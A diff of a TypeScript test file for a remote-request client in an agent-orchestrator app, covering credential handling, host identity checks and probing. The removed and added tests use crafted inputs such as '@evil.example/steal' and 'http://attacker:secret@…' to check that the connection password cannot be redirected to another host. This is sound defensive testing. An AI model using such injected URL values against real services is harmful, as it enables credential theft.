@@ -1,5 +1,5 @@
 import { describe, expect, it, vi } from "vitest";
-import { probeRemote, remoteRequest } from "./remote-request";
+import { IncompatibleRemoteVersionError, probeRemote, readRemoteIdentity } from "./remote-request";
 
 const entry = { label: "workbox", url: "http://192.0.2.1:3011", password: "pw" };
 
@@ -16,65 +16,45 @@ function fakeTextFetch(status: number, text: string) {
 
 const daemonProbe = { status: "ok", service: "agent-orchestrator-daemon", pid: 1234 };
 
-describe("remoteRequest", () => {
-	it("sends the connection password as a Bearer token", async () => {
-		const doFetch = fakeFetch(201, { id: "p1" });
-		await remoteRequest(entry, { method: "POST", path: "/api/v1/projects", body: { path: "/srv/repo" } }, doFetch);
-
+describe("readRemoteIdentity", () => {
+	it("learns the host ID without sending a credential", async () => {
+		const doFetch = fakeFetch(200, { hostId: "h_workbox", apiVersion: 1 });
+		await expect(readRemoteIdentity(entry, doFetch)).resolves.toBe("h_workbox");
 		const [url, init] = doFetch.mock.calls[0] as unknown as [string, RequestInit];
-		expect(url).toBe("http://192.0.2.1:3011/api/v1/projects");
+		expect(url).toBe("http://192.0.2.1:3011/api/v1/identity");
+		expect(new Headers(init.headers).has("Authorization")).toBe(false);
 		expect(init.redirect).toBe("error");
-		expect(new Headers(init.headers).get("Authorization")).toBe("Bearer pw");
-		expect(init.body).toBe('{"path":"/srv/repo"}');
 	});
-
-	it("returns the status and parsed body rather than throwing on 4xx", async () => {
-		const doFetch = fakeFetch(400, { error: "path must be absolute" });
-		await expect(remoteRequest(entry, { method: "POST", path: "/api/v1/projects" }, doFetch)).resolves.toEqual({
-			status: 400,
-			body: { error: "path must be absolute" },
-		});
+	it("rejects the desktop's reserved local host ID", async () => {
+		await expect(readRemoteIdentity(entry, fakeFetch(200, { hostId: "local" }))).rejects.toThrow(/reserved/);
 	});
-
-	// A path is concatenated onto the host url, and "@" turns everything before
-	// it into userinfo — so an unchecked path is a way to post this host's
-	// connection password to someone else's server.
-	it("refuses a path that redirects the credential to another host", async () => {
-		const doFetch = fakeFetch(200);
-		await expect(remoteRequest(entry, { method: "GET", path: "@evil.example/steal" }, doFetch)).rejects.toThrow(
-			/evil\.example/,
-		);
-		expect(doFetch).not.toHaveBeenCalled();
-	});
-
-	it("keeps a protocol-relative path on the saved host", async () => {
-		const doFetch = fakeFetch(200);
-		await remoteRequest(entry, { method: "GET", path: "//evil.example/x" }, doFetch);
-		expect(doFetch.mock.calls[0][0]).toBe("http://192.0.2.1:3011//evil.example/x");
-	});
-
-	it("keeps a reverse-proxy path prefix", async () => {
-		const doFetch = fakeFetch(200);
-		await remoteRequest({ ...entry, url: "http://192.0.2.1/ao" }, { method: "GET", path: "/healthz" }, doFetch);
-		expect(doFetch.mock.calls[0][0]).toBe("http://192.0.2.1/ao/healthz");
-	});
-
-	it("joins paths without doubling the slash on a trailing-slash url", async () => {
-		const doFetch = fakeFetch(200);
-		await remoteRequest({ ...entry, url: "http://192.0.2.1:3011/" }, { method: "GET", path: "/healthz" }, doFetch);
-		expect(doFetch.mock.calls[0][0]).toBe("http://192.0.2.1:3011/healthz");
-	});
-
-	it("accepts a scheme-less URL saved for the CLI", async () => {
-		const doFetch = fakeFetch(200);
-		await remoteRequest({ ...entry, url: "workbox:3011" }, { method: "GET", path: "/healthz" }, doFetch);
-		expect(doFetch.mock.calls[0][0]).toBe("http://workbox:3011/healthz");
+	it.each([undefined, 2])("rejects incompatible API version %s before using the credential", async (apiVersion) => {
+		await expect(readRemoteIdentity(entry, fakeFetch(200, { hostId: "h_workbox", apiVersion })))
+			.rejects.toBeInstanceOf(IncompatibleRemoteVersionError);
 	});
 });
 
 describe("probeRemote", () => {
 	it("reports online on a 200 that carries the daemon's own probe body", async () => {
 		await expect(probeRemote(entry, fakeFetch(200, daemonProbe))).resolves.toBe("online");
+	});
+
+	it("sends the saved credential only to the configured host and never follows redirects", async () => {
+		const doFetch = fakeFetch(200, daemonProbe);
+		await probeRemote({ ...entry, hostId: "h_workbox", url: "http://192.0.2.1/ao/" }, doFetch);
+		const [url, init] = doFetch.mock.calls[0] as unknown as [string, RequestInit];
+		expect(url).toBe("http://192.0.2.1/ao/healthz");
+		expect(init.redirect).toBe("error");
+		expect(new Headers(init.headers).get("Authorization")).toBe("Bearer pw");
+		expect(new Headers(init.headers).get("X-AO-Expected-Host-ID")).toBe("h_workbox");
+		await probeRemote({ ...entry, url: "workbox:3011" }, doFetch);
+		expect(doFetch.mock.calls[1][0]).toBe("http://workbox:3011/healthz");
+	});
+
+	it("refuses embedded URL credentials before sending the saved credential", async () => {
+		const doFetch = fakeFetch(200, daemonProbe);
+		await expect(probeRemote({ ...entry, url: "http://attacker:secret@192.0.2.1:3011" }, doFetch)).resolves.toBe("offline");
+		expect(doFetch).not.toHaveBeenCalled();
 	});
 
 	it("distinguishes a bad password from an unreachable host", async () => {
